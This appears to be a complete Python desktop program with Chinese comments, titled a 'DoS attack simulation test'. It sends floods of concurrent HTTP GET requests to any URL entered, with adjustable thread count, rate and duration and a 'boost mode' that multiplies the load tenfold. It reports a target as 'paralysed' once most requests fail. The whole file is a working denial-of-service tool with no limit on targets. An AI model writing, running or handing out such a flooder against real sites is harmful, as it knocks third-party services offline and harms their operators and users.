import tkinter as tk
from tkinter import messagebox ,filedialog,scrolledtext #對話框、檔案選擇、可捲動文件
import requests #發送http請求
from concurrent.futures import ThreadPoolExecutor #匯入多執行緒的工具
import threading #多線程優化模組
import time 
import queue #執行緒時間的訊息傳遞

running = False  #是否有在執行測試
boost_mode=False #是否啟用加速模式
succes_count = 0 #成功請求次數
fail_count = 0
output_buffer="" #儲存測試結果用的字串
session = requests.Session() #提升效能
msg_queue = queue.Queue() #將執行緒的訊息傳給主執行緒傳遞訊息

def send_request():
    global succes_count,fail_count,output_buffer
    try:
        response = session.get(URL,timeout=5) #使用session發送get請求，超時5秒
        if response.status_code == 200:
            succes_count+=1
            status = f"{response.status_code}成功\n" #紀錄狀態訊息
        else:
            fail_count+=1
            status = f"{response.status_code}非200回應\n"
    except Exception as e:
        fail_count+=1
        status = f"錯誤:{e}\n" #紀錄錯誤訊息
        
    output_buffer += status #把訊息加到結果的緩衝區
    msg_queue.put(status) #把訊息放進queue，交給tkinter去更新

def gui_updater():
    while not msg_queue.empty(): #如果訊息佇列不是空的
        msg = msg_queue.get() #取出訊息
        result_text.insert(tk.END,msg) #把訊息插入文字框的最後一行
        result_text.see(tk.END) #自動捲到最後
    status_label.config(text = f"成功:{succes_count} 失敗:{fail_count}") #更新統計數字
    
    total = succes_count+fail_count #計算總請求數
    if total == 0: #如果還沒有請求
        state = "⌛等待測試..." #等待中的狀態
        color = "black"
    else:
        fail_rate = fail_count/total #計算失敗率
        if fail_rate<0.2 :
            state = "線上😁"
            color = "green"
        elif fail_rate<0.8:
            state = "不穩定⚠️"
            color = "orange"
        else:
            state = "已癱瘓💀💀"
            color = "red"
    status_label.config(text = f"網站狀態:{state}",fg = color) #更新網站狀態顯示
    
    if running:
        root.after(500,gui_updater)
        
def save_to_txt():
    global output_buffer
    file_path = filedialog.asksaveasfilename(
        defaultextension=".txt",filetypes=[("Text files","*.txt")]
    )    
    if file_path:
        try:
            with open(file_path,"w",encoding="utf-8") as f:
                f.write(output_buffer) #寫入結果
            messagebox.showinfo("儲存成功",f"以儲存到:{file_path}")
        except Exception as e:
            messagebox.showerror("儲存錯誤",str(e))
def start_requests():
    global running,URL,succes_count,fail_count,speed,workers,duration,output_buffer
    URL = url_entry.get()
    try:
        speed = int(speed_entry.get()) #每秒請求數
        workers = int(workers_entry.get()) #執行緒數
        duration=int(duration_entry.get()) #執行時間
    except ValueError:
        messagebox.showerror("輸入錯誤") #顯示警告
        return
    if not URL.startswith("http"): #如果網址的格式錯誤
        messagebox.showwarning("網址輸入格式錯誤")
        return 
    running = True
    succes_count = 0 #重設成功的記數
    fail_count = 0 #重設失敗的記數
    output_buffer="" #清空結果緩衝區
    result_text.delete("1.0",tk.END) #清空文字框
    
    gui_updater() #啟動介面更新

    def loop():
        start_time = time.time() #紀錄開始時間
        with ThreadPoolExecutor(max_workers=workers*(10 if boost_mode else 1)) as executer: #建立執行緒池
            while running and (time.time()-start_time<duration): #在運行時間內持續發送請求
                current_speed = speed*(10 if boost_mode else 1) #如果開了加速模式的話，速度乘10
                for _ in range(current_speed): #依照速度發送請求
                    executer.submit(send_request) #把事情丟給執行緒做處理
                time.sleep(1) #每秒一次迴圈
            stop_request() #測試結束
    threading.Thread(target=loop,daemon=True).start() #建立背景執行緒執行loop

def stop_request():
    global running
    running= False
    messagebox.showinfo("測試完成")

def toggle_boost():
    global boost_mode
    boost_mode = not boost_mode #反轉布林值
    state = "已啟用" if boost_mode else"已關閉" #設定狀態文字
    boost_button.config(text=f"加速模式({state})") #更新按鈕文字
    messagebox.showinfo("加速模式",f"目前狀態:{state}") #顯示提示訊息
root = tk.Tk()
root.title("Python Dos攻擊模擬測試")
root.geometry("480x650")

tk.Label(root,text="網址:").pack()
url_entry = tk.Entry(root,width=50)
url_entry.pack() #顯示在畫面
url_entry.insert(0,"https://") #預設值

tk.Label(root,text="每秒請求數:").pack()
speed_entry = tk.Entry(root,width=10)
speed_entry.pack()
speed_entry.insert(0,"10")

tk.Label(root,text="執行緒數:").pack()
workers_entry = tk.Entry(root,width=10)
workers_entry.pack()
workers_entry.insert(0,"10")

tk.Label(root,text="測試總秒數:").pack()
duration_entry = tk.Entry(root,width=10)
duration_entry.pack()
duration_entry.insert(0,"10")

start_button = tk.Button(root,text="開始測試",command= start_requests)
start_button.pack(pady=5)
stop_button = tk.Button(root,text="停止測試",command=stop_request)
stop_button.pack(pady=5)
boost_button = tk.Button(root,text="加速模式(狀態:關閉)",command=toggle_boost)
boost_button.pack(pady=5)
export_button = tk.Button(root,text="匯出執行成果為文字(.txt)檔",command=save_to_txt)
export_button.pack(pady=5)

status_label = tk.Label(root,text="成功: 0 失敗:0",font=("Helvetica",12)) #網站狀態標籤
status_label.pack(pady=5)

tk.Label(root,text="即時狀態回饋:").pack()
result_text = scrolledtext.ScrolledText(root,wrap = tk.WORD,width = 55,height=15) #可捲動的文字欄
result_text.pack()

root.mainloop()